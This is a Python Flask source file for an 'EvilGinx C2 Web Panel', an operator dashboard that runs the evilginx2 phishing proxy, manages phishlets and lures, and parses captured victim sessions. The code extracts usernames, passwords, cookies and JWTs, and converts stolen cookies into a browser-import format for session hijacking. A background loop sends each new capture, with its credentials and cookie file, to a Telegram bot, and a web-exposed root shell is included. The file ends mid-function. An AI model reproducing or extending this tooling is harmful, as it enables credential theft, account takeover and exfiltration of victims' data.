#!/usr/bin/env python3
"""EvilGinx C2 Web Panel"""

import os
import sys
import json
import urllib.request
import urllib.parse
import yaml
import time
import signal
import struct
import fcntl
import termios
import pty
import select
import subprocess
import threading
import secrets
import re
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from functools import wraps

from flask import (
    Flask, render_template, request, redirect,
    url_for, session, jsonify, send_from_directory
)
from flask_socketio import SocketIO, emit

# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

EVILGINX_DIR    = os.environ.get("EVILGINX_DIR",    "/root/evilginx2")
EVILGINX_BIN    = os.path.join(EVILGINX_DIR, "build", "evilginx")
EVILGINX_CONFIG = os.environ.get("EVILGINX_CONFIG", "/root/.evilginx/config.json")
EVILGINX_DATA   = os.environ.get("EVILGINX_DATA",   "/root/.evilginx/data.db")
PHISHLETS_DIR   = os.path.join(EVILGINX_DIR, "phishlets")

PANEL_HOST = os.environ.get("PANEL_HOST", "0.0.0.0")
PANEL_PORT = int(os.environ.get("PANEL_PORT", "8443"))
PANEL_USER = os.environ.get("PANEL_USER", "root")
PANEL_PASS = os.environ.get("PANEL_PASS", "")
PANEL_VERSION = "3.4.0"  # keep in sync with evilginx_setup.PANEL_BUILD + templates

# ═══════════════════════════════════════════════════════════════════════════════
#  FLASK SETUP
# ═══════════════════════════════════════════════════════════════════════════════

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.context_processor
def _inject_panel():
    return {"panel_version": PANEL_VERSION}
app.config["PERMANENT_SESSION_LIFETIME"] = 86400

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ═══════════════════════════════════════════════════════════════════════════════
#  EVILGINX PROCESS MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class EvilginxManager:
    def __init__(self):
        self.process = None
        self.master_fd = None
        self.output_buffer = []
        self.max_buffer = 10000
        self.running = False
        self._reader = None

    def start(self):
        self.stop()
        subprocess.run(["pkill", "-9", "-f", EVILGINX_BIN],
                        capture_output=True, timeout=5)
        time.sleep(1)
        master, slave = pty.openpty()
        self.master_fd = master
        self.process = subprocess.Popen(
            [EVILGINX_BIN, "-p", "phishlets/"],
            stdin=slave, stdout=slave, stderr=slave,
            cwd=EVILGINX_DIR,
            preexec_fn=os.setsid,
        )
        os.close(slave)
        self.running = True
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def stop(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                self.process.wait(timeout=5)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                except Exception:
                    pass
            self.process = None
        if self.master_fd is not None:
            try:
                os.close(self.master_fd)
            except OSError:
                pass
            self.master_fd = None

    def restart(self):
        self.stop()
        time.sleep(2)
        self.start()

    def write(self, data: str):
        if self.master_fd is not None and self.running:
            try:
                os.write(self.master_fd, data.encode())
            except OSError:
                pass

    def resize(self, rows: int, cols: int):
        if self.master_fd is not None:
            try:
                ws = struct.pack("HHHH", rows, cols, 0, 0)
                fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, ws)
            except OSError:
                pass

    def _read_loop(self):
        while self.running:
            try:
                r, _, _ = select.select([self.master_fd], [], [], 0.05)
                if r:
                    chunk = os.read(self.master_fd, 4096)
                    if chunk:
                        text = chunk.decode("utf-8", errors="replace")
                        self.output_buffer.append(text)
                        if len(self.output_buffer) > self.max_buffer:
                            self.output_buffer = self.output_buffer[-self.max_buffer:]
                        socketio.emit("term_out", {"d": text}, namespace="/")
            except OSError:
                break

    def alive(self):
        return self.process is not None and self.process.poll() is None

    def pid(self):
        return self.process.pid if self.process else None


class ShellManager:
    """Interactive login bash PTY — same as a normal Linux console."""

    def __init__(self):
        self.process = None
        self.master_fd = None
        self.output_buffer = []
        self.max_buffer = 8000
        self.running = False
        self._reader = None
        self._lock = threading.Lock()

    def _shell_bin(self):
        for p in ("/bin/bash", "/usr/bin/bash", "/bin/sh"):
            if os.path.isfile(p):
                return p
        return "/bin/sh"

    def alive(self):
        return self.process is not None and self.process.poll() is None

    def ensure(self):
        if not self.alive():
            self.start()

    def start(self):
        with self._lock:
            self._start_unlocked()

    def _start_unlocked(self):
        self._stop_unlocked()
        master, slave = pty.openpty()
        self.master_fd = master
        env = os.environ.copy()
        env["TERM"] = "xterm-256color"
        env["HOME"] = os.environ.get("HOME") or "/root"
        env["USER"] = os.environ.get("USER") or "root"
        env["LOGNAME"] = env["USER"]
        env["SHELL"] = self._shell_bin()
        cwd = env["HOME"] if os.path.isdir(env["HOME"]) else "/root"
        argv = [env["SHELL"]]
        if os.path.basename(env["SHELL"]) == "bash":
            argv.append("-l")
        self.process = subprocess.Popen(
            argv,
            stdin=slave, stdout=slave, stderr=slave,
            cwd=cwd,
            env=env,
            preexec_fn=os.setsid,
        )
        os.close(slave)
        self.running = True
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def stop(self):
        with self._lock:
            self._stop_unlocked()

    def _stop_unlocked(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                self.process.wait(timeout=2)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                except Exception:
                    pass
            self.process = None
        if self.master_fd is not None:
            try:
                os.close(self.master_fd)
            except OSError:
                pass
            self.master_fd = None

    def restart(self):
        self.start()

    def write(self, data):
        if self.master_fd is None or not self.running:
            return
        if not isinstance(data, (bytes, bytearray)):
            data = str(data or "").encode("utf-8", errors="replace")
        try:
            os.write(self.master_fd, data)
        except OSError:
            pass

    def resize(self, rows, cols):
        if self.master_fd is None:
            return
        try:
            ws = struct.pack("HHHH", int(rows) or 24, int(cols) or 80, 0, 0)
            fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, ws)
        except OSError:
            pass

    def _read_loop(self):
        proc = self.process
        while self.running:
            fd = self.master_fd
            if fd is None:
                break
            try:
                r, _, _ = select.select([fd], [], [], 0.05)
                if not r:
                    continue
                chunk = os.read(fd, 4096)
                if not chunk:
                    break
                text = chunk.decode("utf-8", errors="replace")
                self.output_buffer.append(text)
                if len(self.output_buffer) > self.max_buffer:
                    self.output_buffer = self.output_buffer[-self.max_buffer:]
                socketio.emit("shell_out", {"d": text}, namespace="/")
            except OSError:
                break
        if self.process is proc:
            self.running = False
            socketio.emit("shell_out", {
                "d": "\r\n\x1b[33m[shell exited — click Restart]\x1b[0m\r\n"
            }, namespace="/")


class JournalFollower:
    """One live journalctl -f at a time. Starts only when the UI asks; dies on stop/close."""

    def __init__(self):
        self.proc = None
        self.master_fd = None
        self.sid = None
        self.unit = None
        self.running = False
        self._lock = threading.Lock()

    def start(self, unit, sid):
        with self._lock:
            self._stop_unlocked()
            master, slave = pty.openpty()
            self.master_fd = master
            self.sid = sid
            self.unit = unit
            self.proc = subprocess.Popen(
                ["journalctl", "-u", unit, "-n", "120", "-f", "--no-pager", "-o", "short-iso"],
                stdin=subprocess.DEVNULL,
                stdout=slave,
                stderr=slave,
                preexec_fn=os.setsid,
                close_fds=True,
            )
            os.close(slave)
            self.running = True
            threading.Thread(target=self._read_loop, args=(self.proc, sid, master), daemon=True).start()

    def stop(self, sid=None):
        with self._lock:
            if sid and self.sid and sid != self.sid:
                return
            self._stop_unlocked()

    def _stop_unlocked(self):
        self.running = False
        proc = self.proc
        fd = self.master_fd
        self.proc = None
        self.sid = None
        self.unit = None
        self.master_fd = None
        if proc:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            try:
                proc.wait(timeout=1)
            except Exception:
                pass
        if fd is not None:
            try:
                os.close(fd)
            except OSError:
                pass

    def _read_loop(self, proc, sid, fd):
        while self.running and proc is self.proc and fd is not None:
            try:
                r, _, _ = select.select([fd], [], [], 0.2)
                if not r:
                    continue
                chunk = os.read(fd, 4096)
                if not chunk:
                    break
                socketio.emit("journal_out", {"d": chunk.decode("utf-8", errors="replace")},
                              room=sid, namespace="/")
            except OSError:
                break
        if proc is self.proc:
            self.running = False


egm = EvilginxManager()
shm = ShellManager()
jnl = JournalFollower()

# ═══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def _read_config():
    try:
        with open(EVILGINX_CONFIG) as f:
            return json.load(f)
    except Exception:
        return {}

def _write_config(cfg):
    with open(EVILGINX_CONFIG, "w") as f:
        json.dump(cfg, f, indent=2)

def _list_phishlets():
    cfg = _read_config()
    pcfg = cfg.get("phishlets", {})
    result = []
    if not os.path.isdir(PHISHLETS_DIR):
        return result
    for fn in sorted(os.listdir(PHISHLETS_DIR)):
        if not fn.endswith((".yaml", ".yml")):
            continue
        name = fn.rsplit(".", 1)[0]
        path = os.path.join(PHISHLETS_DIR, fn)
        try:
            with open(path) as f:
                raw = f.read()
            data = yaml.safe_load(raw) or {}
        except Exception:
            raw, data = "", {}
        pc = pcfg.get(name, {})
        result.append({
            "name":       name,
            "file":       fn,
            "enabled":    pc.get("enabled", False),
            "visible":    pc.get("visible", True),
            "hostname":   pc.get("hostname", ""),
            "author":     data.get("author", ""),
            "content":    raw,
            "proxy_hosts": data.get("proxy_hosts", []),
        })
    return result


def _tokens_to_browser_format(tokens, phishlet_domain=""):
    """Convert evilginx tokens to browser extension JSON format."""
    cookies = []
    now = time.time()
    for domain, cks in tokens.items():
        for name, ci in cks.items():
            val = ci.get("Value", ci.get("value", ""))
            path = ci.get("Path", ci.get("path", "/"))
            http_only = ci.get("HttpOnly", ci.get("httpOnly", False))
            secure = ci.get("Secure", ci.get("secure", True))
            host_only = not domain.startswith(".")
            cookie = {
                "domain": domain,
                "expirationDate": now + 365 * 86400,
                "hostOnly": host_only,
                "httpOnly": bool(http_only),
                "name": name,
                "path": path or "/",
                "sameSite": "unspecified",
                "secure": bool(secure),
                "session": False,
                "storeId": "0",
                "value": val
            }
            cookies.append(cookie)
    return cookies


_db_lock = threading.Lock()

def _resp_read_line(raw, i):
    j = raw.find(b"\n", i)
    if j < 0:
        return None, len(raw)
    line = raw[i:j]
    if line.endswith(b"\r"):
        line = line[:-1]
    return line, j + 1

def _resp_read_bulk(raw, i):
    hdr, i = _resp_read_line(raw, i)
    if hdr is None or not hdr.startswith(b"$"):
        return None, i
    try:
        n = int(hdr[1:])
    except Exception:
        return None, i
    if n < 0:
        return b"", i
    val = raw[i:i + n]
    i = i + n
    if i < len(raw) and raw[i:i + 1] == b"\r":
        i += 1
    if i < len(raw) and raw[i:i + 1] == b"\n":
        i += 1
    return val, i

def _db_load_sets():
    if not os.path.isfile(EVILGINX_DATA):
        return []
    raw = open(EVILGINX_DATA, "rb").read()
    if not raw:
        return []
    if raw.lstrip()[:1] == b"*":
        pairs = []
        i, n = 0, len(raw)
        while i < n:
            while i < n and raw[i:i + 1] in b"\r\n \t":
                i += 1
            if i >= n:
                break
            hdr, i2 = _resp_read_line(raw, i)
            if hdr is None:
                break
            if not hdr.startswith(b"*"):
                i = i2
                continue
            i = i2
            try:
                argc = int(hdr[1:])
            except Exception:
                continue
            args, ok = [], True
            for _ in range(argc):
                val, i = _resp_read_bulk(raw, i)
                if val is None:
                    ok = False
                    break
                args.append(val)
            if ok and len(args) >= 3 and args[0].lower() == b"set":
                key = args[1].decode("utf-8", "replace")
                pairs.append((key, args[2]))
        return pairs
    pairs = []
    for line in raw.splitlines():
        s = line.strip()
        if s.startswith(b"{"):
            try:
                obj = json.loads(s.decode("utf-8", "replace"))
                sid = obj.get("id")
                if sid is not None:
                    pairs.append(("sessions:%s" % sid, s))
            except Exception:
                pass
    return pairs

def _db_save_sets(pairs):
    out = bytearray()
    for k, v in pairs:
        kb = k.encode("utf-8") if isinstance(k, str) else k
        vb = v if isinstance(v, (bytes, bytearray)) else str(v).encode("utf-8")
        out += b"*3\r\n$3\r\nset\r\n"
        out += ("$%d\r\n" % len(kb)).encode() + kb + b"\r\n"
        out += ("$%d\r\n" % len(vb)).encode() + vb + b"\r\n"
    tmp = EVILGINX_DATA + ".tmp"
    with open(tmp, "wb") as f:
        f.write(out)
        f.flush()
        os.fsync(f.fileno())
    os.replace(tmp, EVILGINX_DATA)

def _db_delete_ids(ids):
    ids = {int(x) for x in ids}
    with _db_lock:
        kept = []
        for k, v in _db_load_sets():
            if k.startswith("sessions:") and k != "sessions:0:id":
                try:
                    sid = int(k.split(":", 1)[1])
                except Exception:
                    kept.append((k, v))
                    continue
                if sid in ids:
                    continue
            kept.append((k, v))
        _db_save_sets(kept)
    return True

def _db_clear_sessions():
    with _db_lock:
        _db_save_sets([("sessions:0:id", b"0")])

def _cookie_looks_like_jwt(name, cookie):
    """Detect JWT in any cookie value, not only a cookie named jwt_bridge."""
    if isinstance(cookie, dict):
        val = cookie.get("Value") or cookie.get("value") or ""
    else:
        val = cookie or ""
    val = str(val).strip()
    if not val.startswith("eyJ"):
        return False
    if name == "jwt_bridge":
        return True
    parts = val.split(".")
    return len(parts) >= 3 and all(parts[:3])


def _parse_sessions():
    seen = {}  # id -> session dict (keep latest update_time)
    if not os.path.isfile(EVILGINX_DATA):
        return []
    try:
        raw = open(EVILGINX_DATA, "rb").read().decode("utf-8", errors="ignore")
    except Exception:
        return []
    for line in raw.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        sid = obj.get("id")
        if sid is None:
            continue
        tokens = obj.get("tokens", {})
        has_jwt = False
        n_cookies = 0
        for dom, cks in tokens.items():
            n_cookies += len(cks)
            for cn, ci in cks.items():
                if _cookie_looks_like_jwt(cn, ci):
                    has_jwt = True
        entry = {
            "id":          sid,
            "phishlet":    obj.get("phishlet", ""),
            "landing_url": obj.get("landing_url", ""),
            "username":    obj.get("username", ""),
            "password":    obj.get("password", ""),
            "useragent":   obj.get("useragent", ""),
            "remote_addr": obj.get("remote_addr", ""),
            "create_time": obj.get("create_time", 0),
            "update_time": obj.get("update_time", 0),
            "has_jwt":     has_jwt,
            "n_cookies":   n_cookies,
            "tokens":      tokens,
        }
        prev = seen.get(sid)
        if prev is None or entry["update_time"] >= prev["update_time"]:
            seen[sid] = entry
    out = list(seen.values())
    out.sort(key=lambda x: x.get("create_time", 0), reverse=True)
    return out

# ═══════════════════════════════════════════════════════════════════════════════
#  AUTH
# ═══════════════════════════════════════════════════════════════════════════════

def auth(fn):
    @wraps(fn)
    def wrapper(*a, **kw):
        if not session.get("ok"):
            if request.is_json or request.path.startswith("/api/"):
                return jsonify(error="Unauthorized"), 401
            return redirect("/login")
        return fn(*a, **kw)
    return wrapper

# ═══════════════════════════════════════════════════════════════════════════════
#  PAGE ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/favicon.ico")
def favicon():
    return send_from_directory(
        os.path.join(app.root_path, "static"),
        "favicon.ico",
        mimetype="image/vnd.microsoft.icon",
    )

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        d = request.get_json(silent=True) or request.form
        if d.get("username") == PANEL_USER and d.get("password") == PANEL_PASS:
            session["ok"] = True
            session.permanent = True
            return jsonify(ok=True)
        return jsonify(error="ACCESS DENIED"), 401
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/")
@auth
def index():
    return render_template("index.html")

# ═══════════════════════════════════════════════════════════════════════════════
#  API — DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/dashboard")
@auth
def api_dashboard():
    cfg = _read_config()
    ss  = _parse_sessions()
    ph  = _list_phishlets()
    try:
        up = float(open("/proc/uptime").read().split()[0])
    except Exception:
        up = 0

    # Chart data: sessions over time (last 7 days, hourly buckets)
    from collections import defaultdict
    from datetime import datetime
    now = int(time.time())
    week_ago = now - 7 * 86400
    timeline = defaultdict(lambda: {"total": 0, "jwt": 0, "cookies": 0, "empty": 0})
    cat_counts = {"jwt": 0, "with_cookies": 0, "empty": 0}
    for s in ss:
        ct = s.get("create_time", 0)
        has_jwt = s.get("has_jwt", False)
        nc = s.get("n_cookies", 0)
        if has_jwt:
            cat_counts["jwt"] += 1
        elif nc > 0:
            cat_counts["with_cookies"] += 1
        else:
            cat_counts["empty"] += 1
        if ct >= week_ago:
            bucket = datetime.fromtimestamp(ct).strftime("%Y-%m-%d %H:00")
            timeline[bucket]["total"] += 1
            if has_jwt:
                timeline[bucket]["jwt"] += 1
            elif nc > 0:
                timeline[bucket]["cookies"] += 1
            else:
                timeline[bucket]["empty"] += 1
    sorted_keys = sorted(timeline.keys())
    chart_timeline = {
        "labels": sorted_keys,
        "total":   [timeline[k]["total"] for k in sorted_keys],
        "jwt":     [timeline[k]["jwt"] for k in sorted_keys],
        "cookies": [timeline[k]["cookies"] for k in sorted_keys],
        "empty":   [timeline[k]["empty"] for k in sorted_keys],
    }

    return jsonify(
        domain          = cfg.get("general", {}).get("domain", ""),
        ipv4            = cfg.get("general", {}).get("external_ipv4", ""),
        total_sessions  = len(ss),
        jwt_sessions    = sum(1 for s in ss if s["has_jwt"]),
        active_phishlets= sum(1 for p in ph if p["enabled"]),
        total_phishlets = len(ph),
        uptime          = up,
        ev_running      = egm.alive(),
        ev_pid          = egm.pid(),
        chart_timeline  = chart_timeline,
        chart_breakdown = cat_counts,
        recent          = [{k: v for k, v in s.items() if k != "tokens"}
                           for s in ss[:10]],
        recent_jwt      = [{k: v for k, v in s.items() if k != "tokens"}
                           for s in ss if s["has_jwt"]][:15],
    )

# ═══════════════════════════════════════════════════════════════════════════════
#  API — CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/config", methods=["GET", "POST"])
@auth
def api_config():
    cfg = _read_config()
    if request.method == "GET":
        return jsonify(cfg)
    d = request.get_json()
    g = cfg.setdefault("general", {})
    for src, dst in [("domain", "domain"), ("ipv4", "external_ipv4"),
                     ("unauth_url", "unauth_url")]:
        if src in d:
            g[dst] = d[src]
    for src, dst, tp in [("dns_port", "dns_port", int),
                         ("https_port", "https_port", int),
                         ("autocert", "autocert", bool)]:
        if src in d:
            g[dst] = tp(d[src])
    if "bind_ipv4" in d:
        g["ipv4"] = d["bind_ipv4"]
    if "blacklist_mode" in d:
        cfg.setdefault("blacklist", {})["mode"] = d["blacklist_mode"]
    _write_config(cfg)
    return jsonify(ok=True, msg="Saved. Restart evilginx to apply.")

# ═══════════════════════════════════════════════════════════════════════════════
#  API — PHISHLETS
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/phishlets")
@auth
def api_phishlets():
    return jsonify(_list_phishlets())

@app.route("/api/phishlets/<name>", methods=["GET", "PUT", "DELETE"])
@auth
def api_phishlet(name):
    fp = os.path.join(PHISHLETS_DIR, f"{name}.yaml")
    if request.method == "GET":
        if not os.path.exists(fp):
            return jsonify(error="Not found"), 404
        return jsonify(name=name, content=open(fp).read())
    if request.method == "DELETE":
        if os.path.exists(fp):
            os.remove(fp)
        cfg = _read_config()
        cfg.get("phishlets", {}).pop(name, None)
        _write_config(cfg)
        return jsonify(ok=True)
    d = request.get_json()
    if "content" in d:
        try:
            yaml.safe_load(d["content"])
        except yaml.YAMLError as e:
            return jsonify(error=f"Bad YAML: {e}"), 400
        with open(fp, "w") as f:
            f.write(d["content"])
    cfg = _read_config()
    pc = cfg.setdefault("phishlets", {}).setdefault(name, {
        "hostname": "", "unauth_url": "", "enabled": False, "visible": True
    })
    for k in ("hostname", "unauth_url"):
        if k in d:
            pc[k] = d[k]
    for k in ("enabled", "visible"):
        if k in d:
            pc[k] = bool(d[k])
    _write_config(cfg)
    return jsonify(ok=True, msg="Updated. Restart to apply.")

@app.route("/api/phishlets", methods=["POST"])
@auth
def api_create_phishlet():
    d = request.get_json()
    name = (d.get("name") or "").strip()
    if not name or not re.match(r"^[a-zA-Z0-9_-]+$", name):
        return jsonify(error="Invalid name"), 400
    fp = os.path.join(PHISHLETS_DIR, f"{name}.yaml")
    if os.path.exists(fp):
        return jsonify(error="Already exists"), 409
    content = d.get("content", "")
    try:
        yaml.safe_load(content)
    except yaml.YAMLError as e:
        return jsonify(error=f"Bad YAML: {e}"), 400
    with open(fp, "w") as f:
        f.write(content)
    cfg = _read_config()
    cfg.setdefault("phishlets", {})[name] = {
        "hostname": "", "unauth_url": "", "enabled": False, "visible": True
    }
    _write_config(cfg)
    return jsonify(ok=True)


# ═══════════════════════════════════════════════════════════════════════════════
#  API — QUICK SETUP
# ═══════════════════════════════════════════════════════════════════════════════



@app.route("/api/phishlets/<name>/toggle", methods=["POST"])
@auth
def api_toggle_phishlet(name):
    d = request.get_json()
    enable = d.get("enable", False)
    cfg = _read_config()
    pc = cfg.get("phishlets", {}).get(name)
    if not pc:
        return jsonify(error="Not found"), 404
    pc["enabled"] = enable
    _write_config(cfg)
    cmd = f"phishlets {'enable' if enable else 'disable'} {name}\n"
    egm.write(cmd)
    return jsonify(ok=True, msg=f"Phishlet '{name}' {'enabled' if enable else 'disabled'}.")

@app.route("/api/phishlets/<name>/unconfigure", methods=["POST"])
@auth
def api_unconfigure_phishlet(name):
    cfg = _read_config()
    pc = cfg.get("phishlets", {}).get(name)
    if not pc:
        return jsonify(error="Not found"), 404
    pc["hostname"] = ""
    pc["enabled"] = False
    egm.write(f"phishlets disable {name}\n")
    lures = cfg.get("lures", [])
    cfg["lures"] = [l for l in lures if l.get("phishlet") != name]
    _write_config(cfg)
    return jsonify(ok=True, msg=f"Phishlet '{name}' unconfigured.")

@app.route("/api/quick-setup", methods=["POST"])
@auth
def api_quick_setup():
    d = request.get_json()
    phishlet = (d.get("phishlet") or "").strip()
    domain   = (d.get("domain") or "").strip()
    hostname = (d.get("hostname") or "").strip()
    ipv4     = (d.get("ipv4") or "").strip()
    lure_path = (d.get("lure_path") or "/").strip()
    blacklist = (d.get("blacklist_mode") or "off").strip()
    enable   = d.get("enable", True)

    if not phishlet:
        return jsonify(error="Phishlet name required"), 400
    fp = os.path.join(PHISHLETS_DIR, f"{phishlet}.yaml")
    if not os.path.exists(fp):
        return jsonify(error=f"Phishlet '{phishlet}' YAML not found in {PHISHLETS_DIR}"), 404

    cfg = _read_config()
    g = cfg.setdefault("general", {})
    if domain:
        g["domain"] = domain
        g["unauth_url"] = f"https://{domain}"
    if ipv4:
        g["external_ipv4"] = ipv4

    pc = cfg.setdefault("phishlets", {}).setdefault(phishlet, {
        "hostname": "", "unauth_url": "", "enabled": False, "visible": True
    })
    if hostname:
        pc["hostname"] = hostname
    if enable:
        pc["enabled"] = True

    cfg.setdefault("blacklist", {})["mode"] = blacklist

    lures = cfg.setdefault("lures", [])
    new_lure = {"hostname": "", "id": "", "info": "", "og_desc": "",
                "og_image": "", "og_title": "", "og_url": "",
                "path": lure_path, "paused": 0, "phishlet": phishlet,
                "redirect_url": "", "redirector": "", "ua_filter": ""}
    lures.append(new_lure)

    _write_config(cfg)
    hn = hostname or domain
    lure_url = f"https://{hn}{lure_path}" if hn else ""
    return jsonify(ok=True,
                   msg="Configuration applied! Restart evilginx to activate.",
                   lure_url=lure_url, lure_index=len(lures)-1)

# ═══════════════════════════════════════════════════════════════════════════════
#  API — LURES
# ═══════════════════════════════════════════════════════════════════════════════

LURE_KEYS = ("hostname", "id", "info", "og_desc", "og_image", "og_title",
             "og_url", "path", "phishlet", "redirect_url", "redirector",
             "ua_filter")

@app.route("/api/lures", methods=["GET", "POST", "PUT", "DELETE"])
@auth
def api_lures():
    cfg = _read_config()
    lures = cfg.get("lures", [])
    if request.method == "GET":
        domain = cfg.get("general", {}).get("domain", "")
        enriched = []
        for i, lr in enumerate(lures):
            lr = dict(lr)
            ph = lr.get("phishlet", "")
            hn = cfg.get("phishlets", {}).get(ph, {}).get("hostname", domain)
            path = lr.get("path", "/")
            lr["url"] = f"https://{hn}{path}" if hn else ""
            lr["index"] = i
            enriched.append(lr)
        return jsonify(enriched)
    if request.method == "POST":
        d = request.get_json()
        new = {k: d.get(k, "") for k in LURE_KEYS}
        new["paused"] = int(d.get("paused", 0))
        lures.append(new)
        cfg["lures"] = lures
        _write_config(cfg)
        return jsonify(ok=True, index=len(lures) - 1)
    if request.method == "PUT":
        d = request.get_json()
        idx = d.get("index")
        if idx is None or not (0 <= idx < len(lures)):
            return jsonify(error="Bad index"), 400
        for k in LURE_KEYS:
            if k in d:
                lures[idx][k] = d[k]
        if "paused" in d:
            lures[idx]["paused"] = int(d["paused"])
        cfg["lures"] = lures
        _write_config(cfg)
        return jsonify(ok=True)
    d = request.get_json()
    idx = d.get("index")
    if idx is None or not (0 <= idx < len(lures)):
        return jsonify(error="Bad index"), 400
    lures.pop(idx)
    cfg["lures"] = lures
    _write_config(cfg)
    return jsonify(ok=True)


# ═══════════════════════════════════════════════════════════════════════════════
#  TELEGRAM NOTIFICATIONS
# ═══════════════════════════════════════════════════════════════════════════════

NOTIF_SETTINGS = os.path.join(os.path.dirname(EVILGINX_CONFIG), "notif_settings.json")
NOTIF_SENT     = os.path.join(os.path.dirname(EVILGINX_CONFIG), "notif_sent_ids.json")

def _read_notif_settings():
    if os.path.isfile(NOTIF_SETTINGS):
        try:
            return json.load(open(NOTIF_SETTINGS))
        except Exception:
            pass
    return {"bot_token": "", "chat_id": "", "enabled": False, "notify_jwt": True, "notify_tokens": True}

def _write_notif_settings(s):
    with open(NOTIF_SETTINGS, "w") as f:
        json.dump(s, f, indent=2)

def _read_sent_ids():
    if os.path.isfile(NOTIF_SENT):
        try:
            return set(json.load(open(NOTIF_SENT)))
        except Exception:
            pass
    return set()

def _write_sent_ids(ids):
    with open(NOTIF_SENT, "w") as f:
        json.dump(list(ids), f)

def _send_telegram(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = urllib.parse.urlencode({
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": "true"
    }).encode()
    try:
        req = urllib.request.Request(url, data=data)
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read()), None
    except Exception as e:
        return None, str(e)


def _send_telegram_doc(bot_token, chat_id, filename, content, caption=""):
    import io
    boundary = "----FormBoundary" + str(int(time.time()))
    body = ""
    body += f"--{boundary}\r\n"
    body += f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
    body += f"--{boundary}\r\n"
    body += f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
    body += f"--{boundary}\r\n"
    body += f'Content-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n'
    body += f"--{boundary}\r\n"
    body += f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
    body += f'Content-Type: application/json\r\n\r\n'
    body_bytes = body.encode() + content.encode() + f"\r\n--{boundary}--\r\n".encode()
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        req = urllib.request.Request(url, data=body_bytes)
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        resp = urllib.request.urlopen(req, timeout=15)
        return json.loads(resp.read()), None
    except Exception as e:
        return None, str(e)

def _format_session_telegram(s):
    lines = []
    lines.append("🚨 <b>New Session Captured!</b>")
    lines.append(f"")
    lines.append(f"🎯 <b>Phishlet:</b> {s.get('phishlet', '?')}")
    lines.append(f"🌐 <b>IP:</b> {s.get('remote_addr', '?')}")
    lines.append(f"⏰ <b>Time:</b> {s.get('create_time', '?')}")
    lines.append(f"🔗 <b>Landing:</b> {s.get('landing_url', '?')}")
    if s.get('username'):
        lines.append(f"👤 <b>Username:</b> <code>{s['username']}</code>")
    if s.get('password'):
        lines.append(f"🔑 <b>Password:</b> <code>{s['password']}</code>")
    tokens = s.get('tokens', {})
    if tokens:
        lines.append(f"")
        lines.append(f"🍪 <b>Cookies ({s.get('n_cookies', 0)}):</b>")
        for dom, cks in tokens.items():
            for cn, ci in cks.items():
                val = ci.get('Value', ci.get('value', ''))
                short = val[:80] + '...' if len(val) > 80 else val
                lines.append(f"  • <b>{dom}</b> / {cn} = <code>{short}</code>")
    if s.get('has_jwt'):
        lines.append(f"")
        lines.append(f"✅ <b>JWT TOKEN CAPTURED!</b>")
    lines.append(f"")
    lines.append(f"📋 <b>Session ID:</b> {s.get('id', '?')}")
    return "\n".join(lines)

def _notif_monitor_loop():
    while True:
        try:
            time.sleep(15)
            settings = _read_notif_settings()
            if not settings.get('enabled') or not settings.get('bot_token') or not settings.get('chat_id'):
                continue
            sessions = _parse_sessions()
            sent_ids = _read_sent_ids()
            new_sent = set()
            for s in sessions:
                sid = s['id']
                if sid in sent_ids:
                    continue
                should_send = False
                if settings.get('notify_jwt') and s.get('has_jwt'):
                    should_send = True
                if settings.get('notify_tokens') and s.get('n_cookies', 0) > 0:
                    should_send = True
                if should_send:
                    text = _format_session_telegram(s)
                    _send_telegram(settings['bot_token'], settings['chat_id'], text)
                    cookies = _tokens_to_browser_format(s.get('tokens', {}))
                    if cookies:
                        json_str = json.dumps(cookies, indent=4)
                        fname = f"session_{sid}_{s.get('phishlet','')}.json"
                        caption = f"🍪 Cookies for session #{sid} ({s.get('phishlet','')}) - import via EditThisCookie/AceStorage"
                        _send_telegram_doc(settings['bot_token'], settings['chat_id'], fname, json_str, caption)
                    new_sent.add(sid)
            if new_sent:
                sent_ids.update(new_sent)
                _write_sent_ids(sent_ids)
        except Exception:
            pass


def _session_live_loop():
    """Push dashboard updates the moment a session gains JWT or cookies."""
    prev = {}
    seeded = False
    last_mtime = 0
    last_size = -1
    while True:
        try:
            time.sleep(1)
            if not os.path.isfile(EVILGINX_DATA):
                continue
            st = os.stat(EVILGINX_DATA)
            if st.st_mtime == last_mtime and st.st_size == last_size:
                continue
            last_mtime = st.st_mtime
            last_size = st.st_size
            sessions = _parse_sessions()
